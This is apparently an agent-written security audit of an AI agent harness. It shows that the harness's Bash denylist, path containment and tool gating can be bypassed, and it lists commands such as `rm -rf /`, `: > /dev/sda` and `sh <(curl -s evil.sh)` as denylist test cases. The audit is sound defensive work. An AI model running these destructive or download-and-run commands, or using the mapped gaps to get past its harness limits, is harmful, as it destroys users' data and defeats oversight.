# Codebase Forensics — comp-neuroscientist

Date: 2026-09-28
Method: executed probes. Every claim below is backed by captured output.

> No skill named `codebase-forensic` exists (48 skills checked). The only forensic skill is
> `architecture-forensics`; it returns a *procedure*, which was then executed by hand.

## Baseline (verified before touching anything)
- `python -m pytest tests/ -q` → **37 passed**, exit 0
- `main` @ `2aeb1e4`; 4 modified files predate this investigation and were **not** touched by it.

## Live path
```
cli.py → agent.py::consume_stream → claude_agent_sdk.query → _run_agent_loop
                                            ├─ _build_tools(allowed_tools)  → schemas only
                                            └─ _TOOL_MAP.get(name)          → dispatch, ungated
```

---

## D1 — Path containment documented, not implemented
`_safe_resolve`'s docstring claims traversal protection; its own comment concedes it can't.
Reproduced: read **and** write escape the workspace root against a writable target.
*Method note:* my first probe hit `/etc` and was blocked — that was macOS SIP, not this code.
Re-tested against a writable target to avoid reporting a false pass.

## D2 — `allowed_tools` not enforced at dispatch
`dispatch lookup: True` / `gate check near dispatch: False`.
`_build_tools` only filters schemas **shown to the model**; the executor re-resolves by name with
no membership check. The gate is advisory, not authoritative.

## D3 — `_safe_int_env` has no range check
`'-1' → -1`, `'0' → 0`, `'9999999999999999999999' → 9999999999999999999999`, `'０１２' → 12`.
Only `ValueError` caught. Sole consumer is `max_turns` (`config.py:29`) → feeds the loop bound.
`test_config.py:78-90` covers valid/empty/invalid-text but **not range** — the biting class.

## D4 — Subagent delegation is prose, not dispatch
`_TOOL_MAP` = Bash/Glob/Grep/Read/Write. No Task/Agent/handoff tool exists.
`options.agents` is read at L381-383 solely to append `- **{name}**: {description}` to the prompt.
`AgentDefinition.prompt` — **0 readers**. All 8 subagents declare the same 5 tools.
The module docstring's "handing off to subagents" describes a mechanism that does not exist.

## D5 — Bash denylist is INVERTED; misses the most dangerous command  ← most severe
Pattern `r"\brm\s+-rf\s*/\b"`. `/` is non-word, so trailing `\b` demands a **word** char next.

| command | char after `/` | matched |
|---|---|---|
| `rm -rf /` | *end of string* | **no** |
| `rm -rf / ` | *space* | **no** |
| `rm -rf /Users/philosopher` | `U` | **yes** |

```
MOST dangerous  'rm -rf /'                   blocked=False
LESS dangerous  'rm -rf /Users/philosopher'  blocked=True
```

The denylist blocks the *less* dangerous command and permits the catastrophic one. Same bug in
`r"\bchmod\s+-R\s+777\s*/\b"`. **0 of 9 patterns can match a bare `/` target.**
Sweep: **16 of 21 cases missed** — incl. `rm -rf ~`, `rm -rf .`, `rm -rf $HOME`, `rm -fr /`,
`rm --recursive --force /`, `: > /dev/sda`, `sh <(curl -s evil.sh)`.
End-to-end in a disposable sandbox: `rm -rf <dir>` was unblocked, ran, destroyed the data.

> ⚠️ **Do not patch this with a better regex.** My candidate in `probe10` fixes `/` but I
> *measured it failing* on `~`, `.`, `$HOME`, and long-flag forms. Regex denylists are the wrong
> shape. Correct fix = **allowlist**: parse argv without `shell=True`, permit known
> binaries/subcommands, reject the rest. Flagging the bug; not shipping a partial fix.

---

## Dead code (single-hit, grep across src/ tests/ tui/)
| symbol | site | refs | verdict |
|---|---|---|---|
| `_TOOL_TIMEOUT` | `claude_agent_sdk.py:209` | 1 (self) | dead — guards nothing |
| `Config.effort` | `config.py:31` | 1 (self) | dead — `CN_EFFORT` read, never consumed |
| `AgentDefinition.prompt` | registry | 0 | dead — see D4 |

`_BASH_TIMEOUT` **is** correctly wired to `subprocess.run`, so the timeout gap is specific.

## `local` is not a trust boundary
`config.local` is written (`cli.py:99`) and read **nowhere**. `CN_LOCAL` only reaches
`_resolve_default_model` (`config.py:68`) → selects a model *name*. `--local` changes the model
string and nothing else: same endpoint, same tool permissions, same filesystem access.

## Confirmed clean
- **Cross-language contract intact.** All 6 event types match the Go `Event` json tags
  key-for-key. (The lone "never emitted" field is `type`, excluded by construction — artifact.)
  Note: a rename in either language is currently **uncaught by any test**.
- All 7 `config.*` attrs referenced by `agent.py` exist.
- Max-turns exhaustion does emit terminal `ResultMessage(is_error=True)`.
- `session_id` consistent (L387 → 414/423/465/554).

## Incomplete
- `_safe_resolve`'s escape surface is **not exhaustively mapped** — one escape reproduced, not enumerated.
- **No fixes landed.** Everything above is diagnosis.
- `.forensics/` is **not gitignored**; it holds the probe set (`probe5`–`probe10` + outputs).
  Nothing deleted or committed.

## Priority
1. **Bash denylist** → argv allowlist. Highest severity.
2. `_safe_resolve` — make the docstring true.
3. `allowed_tools` — enforce at dispatch.
4. `_safe_int_env` — clamp, plus the missing range tests.
5. Subagent docstring — implement `Task` or stop claiming it.
6. Delete or wire the three dead symbols.
